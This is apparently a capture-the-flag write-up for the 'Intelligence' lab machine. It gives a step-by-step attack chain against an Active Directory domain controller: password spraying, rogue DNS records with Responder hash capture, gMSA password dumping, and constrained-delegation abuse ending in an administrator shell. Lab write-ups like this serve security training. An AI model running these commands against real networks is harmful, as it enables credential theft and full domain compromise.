## Intelligence

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.248 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/e1490df1-e4ed-4a93-9d94-5e42e46d21fc)

<br>

On website, we have 2 PDFs inside /documents with the name as a date.  

We can make a python script to create a wordlist to fuzz this.

```python
for i in range(1,13):
    for x in range(1,32):
        # Month
        if len(str(i)) == 1:
            y    = "2020-0" + str(i)
        else:
            y    = "2020-" + str(i)

        # Day
        if len(str(x)) == 1:
            finalPDF = y + "-0" + str(x) + "-upload.pdf"
        else:
            finalPDF = y + "-" + str(x) + "-upload.pdf"

        file = open("wordlistPDF.txt", "a")
        file.write(finalPDF)
        file.write("\n")

print("Generated --> wordlistPDF.txt")
```

```
ffuf -w wordlistPDF.txt -u http://intelligence.htb/documents/FUZZ
echo pdfs.txt | cut -f2 -d":" > edited.txt
```

![generateWordlist](https://github.com/b1d0ws/OSCP/assets/58514930/795e99ac-562c-4cee-89d3-35a48d7b2091)

![ffuf](https://github.com/b1d0ws/OSCP/assets/58514930/de5dacb1-bf11-4168-ab5f-a9c0ecb3dd0f)

<br>

Now we can use a bash script to download everyfile.

```bash
#!/bin/bash
 
filename="pdfs.txt"
 
for line in $(cat "$filename")
do
  wget "http://intelligence.htb/documents/$line"
done
```

![downloadPDFs](https://github.com/b1d0ws/OSCP/assets/58514930/f85367e8-0112-4d09-a4a4-232c445c7f65)

<br>

We can enumerate users filtering the "Creator" field in exiftool.

```
exiftool * | grep Creator | cut -f2 -d":" > users.txt

# Removing blank spaces
sed -r 's/\s+//g' pdfs.txt
sed -r 's/\s+//g' users.txt
```

![usersTXT](https://github.com/b1d0ws/OSCP/assets/58514930/f27aa665-4ba5-499b-a624-1cde255ae432)

<br>

Reading the PDFs we find a default password: NewIntelligenceCorpUser9876, so we can password spray with crackmapexec and list shares with the user found.

```
sudo crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876 | grep +

sudo crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares

```

![crackmapUsers](https://github.com/b1d0ws/OSCP/assets/58514930/5900d2b8-07c8-4710-92db-ea3734206a80)

<br>

There is a cleaner way to do this all above.

```
# PDFs
d=2020-01-01; while [ "$d" != `date -I` ]; do echo "http://10.10.10.248/Documents/$d-
upload.pdf"; done | xargs -n 1 -P 20 wget < list 2>/dev/null

# Creators
exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist

# Reading PDFs
for f in *pdf; do pdftotext $f; done
head -n1 *txt
```

### Root Flag

#### Ted Graves User

Enumerating shares, we find a powershell script that resolves DNS where the name starts with web.

Use dnstool to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone to add a new record that points to our own IP address, use responder to get a user hash and crack it with hashcat.

```
smbclient //10.10.10.248/IT -U "Tiffany.Molina"

python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.21 -t A

responder -I tun0

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

![downdetectorDownload](https://github.com/b1d0ws/OSCP/assets/58514930/1b07db10-6d60-4768-8d49-4e6865bc8a49)

![downdetector](https://github.com/b1d0ws/OSCP/assets/58514930/f9961d23-37b6-47b9-93f4-8fb1ec2d8b48)

![dnstool](https://github.com/b1d0ws/OSCP/assets/58514930/2f124c86-237a-48b8-843a-ecbbbf66811e)

![responder](https://github.com/b1d0ws/OSCP/assets/58514930/b597568e-2b4d-4147-9410-a5a42f99f334)

![hashcatTed](https://github.com/b1d0ws/OSCP/assets/58514930/d80f9241-113a-4e34-885d-078f0ab6e83e)

<br>

#### SVC_INIT User

Using bloodhound, we see that Ted.Graves belongs to ITSUPPORT group and we have ReadGMSAPassword on SVC_INT.

We can use gMASDumper to get this user hash.

```
python3 bloodhound.py -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c all

zip -r intelligence.zip *.json

python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 10.10.10.248
```

![bloodhound](https://github.com/b1d0ws/OSCP/assets/58514930/19756c6b-72ff-485a-b2ee-fac5fb52c64a)

![gMSADumper](https://github.com/b1d0ws/OSCP/assets/58514930/e1ecba41-8a16-4ed6-8630-c89771305682)

<br>

#### System User

SVC_INIT has AllowedToDelegate rights to the Domain Controller. We can abuse constrained delegation to request a TGT for the Administrator user.

```
# Abuse constrained delegation
timedatectl set-ntp 0
sudo ntpdate -s 10.10.10.248
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :ff3418066942aa8bd228ea17dc71999a

# Get a Shell with wmiexec
export KRB5CCNAME=Administrator.ccache
echo "10.10.10.248 dc.intelligence.htb" | sudo tee -a /etc/hosts
impacket-wmiexec -k -no-pass dc.intelligence.htb
```

![getAdministrator](https://github.com/b1d0ws/OSCP/assets/58514930/5ac88ed1-c299-444a-a450-ac7d8d454a6e)
